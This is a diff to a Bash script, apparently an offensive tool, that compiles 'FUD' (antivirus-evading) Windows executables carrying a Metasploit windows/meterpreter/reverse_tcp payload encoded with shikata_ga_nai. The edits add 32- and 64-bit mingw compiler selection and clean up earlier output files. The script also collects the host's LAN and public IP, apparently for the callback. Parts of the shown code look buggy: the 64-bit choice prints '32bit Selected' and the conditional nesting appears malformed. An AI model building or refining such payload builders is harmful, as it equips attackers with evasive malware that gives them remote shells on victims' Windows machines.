@@ -46,27 +46,37 @@ lanip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'
 lanip6=`ip addr | grep 'state UP' -A4 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
 publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
 hostn=`host $publicip | awk '{print $5}' | sed 's/.$//'`
-
+comp="0"
 # Warn if the gcc-mingw32 package is not located here /usr/bin/i586-mingw32msvc-gcc
 # You may need to install the following on Kali Linux to compile the C to an Exe - "apt-get install gcc-mingw32"
 # check mingw if exists
-      which i586-mingw32msvc-gcc > /dev/null 2>&1
-      if [ "$?" -eq "0" ]; then
-      echo [✔]::[mingw32]: installation found!;
-      COMPILER="i586-mingw32msvc-gcc"
-else
       which i686-w64-mingw32-gcc > /dev/null 2>&1
-      if [ $? -eq 0 ]; then
+      if [ "$?" -eq "0" ]
+      then
       echo [✔]::[mingw32]: installation found!;
-      COMPILER="i686-w64-mingw32-gcc"
+      comp="1"
+fi
+      which x86_64-w64-mingw32-gcc > /dev/null 2>&1
+      if [ $? -eq 0 ]
+      then
+      echo [✔]::[mingw64]: installation found!;
+     
+if [ $comp == "0" ]
+then
+comp="2"
+elif [ $comp == "1" ]
+then
+comp="3"
 else
-   echo [x]::[warning]:this script require mingw32 installed to work ;
+   echo [x]::[warning]:this script require mingw32 or mingw64 installed to work ;
    echo ""
-   echo [!]::Run setup.sh to install mingw32 ;
+   echo [!]::Run setup.sh to install mingw64 ;
    sleep 2s
    exit 1
  fi
 fi
+
+
 
 # check upx if exists
       which upx > /dev/null 2>&1
@@ -96,7 +106,6 @@ fi
 
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
-resize -s 30 76
 clear                                   
 SERVICE=service;
 
@@ -110,7 +119,10 @@ red='\e[1;31m'
 yellow='\e[1;33m'
 BlueF='\e[1;34m'
 yellow='\e[1;33m'
+orange='\e[38;5;166m'
 
+rm -f $path/output/Powerfull.exe >/dev/null 2>&1
+rm -f $path/output/Powerfull-fud.exe >/dev/null 2>&1
 #Banner
 clear
 echo
@@ -156,6 +168,51 @@ read inp
 ./powerfull.sh
 fi
 
+echo ""
+if [ $comp == "1" ]
+then
+COMPILER="i686-w64-mingw32-gcc"
+fi
+if [ $comp == "2" ]
+then
+COMPILER="x86_64-w64-mingw32-gcc"
+fi
+
+if [ $comp == "3" ]
+then
+echo ""
+echo -e $yellow "You can compile this FUD for 32bit or 64bit windows machines"
+echo ""
+echo -e $green "Choose one of the following options"
+echo -e $orange "+-------------------------------+"
+echo -e $orange "|$white [$green 1$white ] $yellow Compile 32bit FUD Exe $orange |"
+echo -e $orange "|$white [$green 2$white ] $yellow Compile 64bit FUD Exe $orange |"
+echo -e $orange "+-------------------------------+"
+echo ""
+echo -ne $green "Choose (1 or 2) : " ;tput sgr0
+read archs
+case $archs in 
+1)
+COMPILER="i686-w64-mingw32-gcc"
+echo ""
+echo -e $green "32bit Selected"
+sleep 1
+;;
+2)
+COMPILER="x86_64-w64-mingw32-gcc"
+echo ""
+echo -e $green "32bit Selected"
+sleep 1
+;;
+*)
+COMPILER="i686-w64-mingw32-gcc"
+echo ""
+echo -e $green "Invalid Option , setting 32bit as default"
+sleep 1
+;;
+esac
+fi
+echo -e $okegreen 
 payload="windows/meterpreter/reverse_tcp"
 msfvenomBadChars="\x00\xff"
 msfvenomEncoder="x86/shikata_ga_nai"
